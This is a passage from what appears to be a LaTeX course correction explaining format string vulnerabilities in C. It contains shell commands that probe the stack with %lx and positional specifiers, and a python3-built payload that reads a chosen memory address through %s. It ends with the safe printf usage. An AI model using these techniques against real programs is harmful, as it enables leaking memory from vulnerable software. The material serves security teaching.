The safe version prints the format string literally. The vulnerable version interprets each \texttt{\%08x} as a request to read a value. On x86-64, the first few format arguments come from registers (\texttt{rsi}, \texttt{rdx}, \texttt{rcx}, \texttt{r8}, \texttt{r9}), then subsequent ones come from the stack.

\medskip
\textbf{Using \texttt{\%lx} to read 64-bit values:}
\begin{lstlisting}[language=bash,numbers=none]
$ ./a.out "%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx" 42
\end{lstlisting}

Each \texttt{\%lx} reads an 8-byte value (long) from the argument list. This reveals the contents of the stack: local variables, saved registers, return addresses, etc.

\medskip
\textbf{Using positional arguments to target specific stack slots:}

The notation \texttt{\%N\$lx} reads the $N$-th argument directly:
\begin{lstlisting}[language=bash,numbers=none]
$ ./a.out "%1\$lx %2\$lx %3\$lx %4\$lx %5\$lx %6\$lx %7\$lx %8\$lx" 42
\end{lstlisting}

This allows reading specific positions in the argument list without consuming all the preceding values. By varying $N$, you can explore the entire stack.

\medskip
\textbf{Why does \texttt{printf} process these format specifiers?}

When \texttt{printf} encounters a format specifier (\texttt{\%x}, \texttt{\%lx}, \texttt{\%s}, etc.), it reads the next argument from the calling convention's argument locations (registers first, then stack). It has \textbf{no way to know} how many arguments were actually provided -- it blindly trusts the format string. With \texttt{printf(texte)}, the attacker controls the format string and can therefore read (and even write) arbitrary memory.

\item \textbf{Using \texttt{\%s} to read a string at a chosen address:}

\medskip
\textbf{What happens with \texttt{\%s}:}

The \texttt{\%s} format specifier tells \texttt{printf} to read a \textbf{pointer} from the argument list and then print the null-terminated string at that address. If we can control which value is used as the pointer, we can read arbitrary memory.

\begin{lstlisting}[language=bash,numbers=none]
$ ./a.out "%s" 42
\end{lstlisting}

This will try to read a string from whatever address happens to be in the \texttt{rsi} register (the second argument register). This will likely crash with a segfault because that value is probably not a valid address.

\medskip
\textbf{Controlling the address for \texttt{\%s}:}

The key insight is that the format string itself (\texttt{texte}) lives on the stack. If we place an address at the beginning of our format string, and then use a positional \texttt{\%s} to reference the stack slot where our format string begins, \texttt{printf} will dereference our chosen address.

Strategy:
\begin{enumerate}
\item First, determine which positional argument corresponds to the start of the \texttt{texte} buffer on the stack. Use multiple \texttt{\%lx} to identify where you see the bytes of your own format string:
\begin{lstlisting}[language=bash,numbers=none]
$ ./a.out "AAAAAAAA%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx" 42
\end{lstlisting}
Look for \texttt{4141414141414141} in the output. If it appears at position $k$, then \texttt{\%k\$s} will dereference the 8-byte value at the start of \texttt{texte}.

\item Then replace the 8 'A' bytes with the address of \texttt{test\_var} (obtained from the debug output: \texttt{0x404030}), followed by \texttt{\%k\$s}:
\begin{lstlisting}[language=bash,numbers=none]
$ ./a.out $(python3 -c "import sys; sys.stdout.buffer.write(b'\x30\x40\x40\x00\x00\x00\x00\x00' + b'%6\$s')") 42
\end{lstlisting}
(where 6 is replaced by the actual position $k$ you discovered)
\end{enumerate}

\medskip
\textbf{Result:}

If the position is correct, \texttt{printf} will:
\begin{enumerate}
\item Find the 8-byte value at position $k$ in its argument list
\item This value is the start of \texttt{texte}, which contains \texttt{0x0000000000404030}
\item Interpret this as a pointer and print the string at address \texttt{0x404030}
\item This is the address of \texttt{test\_var}, so it prints the bytes of \texttt{test\_var} interpreted as a string
\end{enumerate}

Since \texttt{test\_var} = \texttt{0x00646464}, the bytes in memory (little-endian) are \texttt{64 64 64 00}. Interpreted as a string: \texttt{"ddd"} (since \texttt{0x64} = 'd' in ASCII).

\begin{attention}
\begin{itemize}
\item The exact positional argument number $k$ depends on your compiler, system, and the size of the format string. You must discover it empirically using \texttt{\%lx} probes.
\item Null bytes (\texttt{\textbackslash x00}) in the address may cause \texttt{strcpy} to truncate the string prematurely. Placing the address bytes at the end of the format string (using \texttt{\%k\$s} first, then the address) or using direct input methods can help.
\item On 64-bit systems, addresses in the low range (like \texttt{0x404030}) contain null bytes in the upper bytes, making this exploit trickier than on 32-bit systems.
\end{itemize}
\end{attention}

\end{enumerate}

\begin{pointcle}
\begin{itemize}
    \item \texttt{printf(texte)} is \textbf{dangerous} because the attacker controls the format string and can read arbitrary memory locations.
    \item \texttt{printf("\%s", texte)} is \textbf{safe} because the format string is fixed by the programmer.
    \item Format specifiers like \texttt{\%x}, \texttt{\%lx} allow reading the stack contents (registers, then stack memory).
    \item The \texttt{\%s} specifier dereferences a pointer from the argument list, enabling reads at arbitrary addresses.
    \item The \texttt{\%n} specifier (not explored here) can \textbf{write} to memory, making format string bugs exploitable for arbitrary code execution.
    \item \textbf{Rule:} \textit{Never} pass user-controlled data as the first argument to \texttt{printf} (or \texttt{sprintf}, \texttt{fprintf}, etc.).
\end{itemize}
\end{pointcle}

\end{correction}


\end{document}
